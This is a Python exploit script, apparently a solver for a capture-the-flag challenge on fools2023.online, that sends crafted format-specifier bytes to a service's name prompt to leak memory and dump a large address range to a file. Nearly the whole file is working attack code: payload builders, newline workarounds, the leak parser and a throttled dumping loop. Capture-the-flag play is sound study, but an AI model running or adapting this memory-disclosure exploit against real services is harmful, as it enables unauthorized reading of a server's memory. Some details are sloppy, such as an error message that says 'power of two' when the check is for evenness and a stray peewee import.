#!/usr/bin/env python3
import argparse
import io
import random
import subprocess
import sys
import time
import socket
from itertools import chain
from typing import *

from peewee import izip_longest

import foolsocket


# 16-bit reads
def format_read_addr_range_xf0(address: int, length: int) -> bytes:
    if length % 2 != 0:
        raise RuntimeError("Length must be a power of two")
    payload = b''
    for i in range(address, address + length, 2):
        payload += b'\xf0' + i.to_bytes(2, byteorder="little")
    return payload


# 8-bit reads
def format_read_addr_range_xf1(address: int, length: int) -> bytes:
    payload = b''
    for i in range(address, address + length, 1):
        payload += b'\xf1' + i.to_bytes(2, byteorder="little")
    return payload


def convert_leak_to_bytes(leak: bytes, count: int) -> bytes:
    prefix = b'\n-----\n\nWelcome, '
    if not leak.startswith(prefix):
        raise RuntimeError("Unexpected response from server")
    leak = leak.strip(prefix)
    leak = leak[0:count * 2]
    return bytes.fromhex(leak.decode("ascii"))


def read_addr_raw(addr: int, count: int, formatter: Callable[[int, int], bytes], leak_size: int) -> bytes:
    if leak_size >= 2 and count % 2 != 0:
        raise RuntimeError("Count must be a multiple of two")

    f = foolsocket.FoolsSocket("fools2023.online", 13339)
    data = f.expect(b"15 characters): ")
    f.communicate(formatter(addr, count) + b'\n')
    data = f.expect(b"to leave: ")
    print(data)

    dumped_bytes = convert_leak_to_bytes(data, count)
    result = bytearray(dumped_bytes)
    # We're dumping by using the read16 format specifier, this undoes
    # the endianess, so we get the correct byte order
    if leak_size >= 2:
        for i in range(0, len(result), 2):
            temp = result[i]
            result[i] = result[i + 1]
            result[i + 1] = temp
    return bytes(result)


def address_contains_newline(addr: int) -> bool:
    addr_bytes = addr.to_bytes(2, byteorder="little")
    return 0x0A in addr_bytes


def address_with_newline_replaced(addr: int, replacement: int) -> int:
    addr_bytes = addr.to_bytes(2, byteorder="little")
    return int.from_bytes(bytes([x if x != 0x0A else (replacement & 0xFF) for x in addr_bytes]), byteorder="little")


def is_range_touching_newline_bad_area(addr: int, count: int) -> bool:
    # not like this
    for i in range(addr, addr + count, 1):
        if address_contains_newline(i):
            return True
    return False


def read_addr(addr: int, count: int) -> bytes:
    if addr > 0xFFFF:
        raise RuntimeError("Invalid address")
    if addr + count - 1 > 0xFFFF:
        raise RuntimeError("Invalid address")

    if is_range_touching_newline_bad_area(addr, count):
        print("WARNING: Range has newline character. This WILL break things.")
        print("Using byte reads instead")
        output = bytearray()
        for ptr in range(addr, addr + count, 1):
            if address_contains_newline(ptr):
                print(f"Using misaligned 16-bit read for {format(ptr, 'X').zfill(4)}")
                # Do a misaligned 16-bit read, then discard the lower byte
                # This will fail on 0Axx, but who cares about that lol (wait, i do..)
                misaligned_bytes = read_addr_raw(address_with_newline_replaced(ptr, 0x9), 2, format_read_addr_range_xf0,
                                                 2)
                output += misaligned_bytes[1:]
            else:
                output += read_addr_raw(ptr, 1, format_read_addr_range_xf1, 1)
        return bytes(output)
    else:
        return read_addr_raw(addr, count, format_read_addr_range_xf0, 2)


def main():
    step_bytes = 10
    monitor_bytes = bytearray()
    for i in range(0x1000, 0xA000, step_bytes):
        bytes_to_read = min(step_bytes, 0xA000 - i)
        b = read_addr(i, bytes_to_read)
        monitor_bytes += b
        time.sleep(random.randint(200, 700) / 1000.0)
        print(b)
        print(f"Progress: ${format(i, 'X').zfill(4)} / $FFFF   | {b}")

    with open("monitor.bin", "wb") as f:
        f.write(monitor_bytes)


if __name__ == '__main__':
    main()
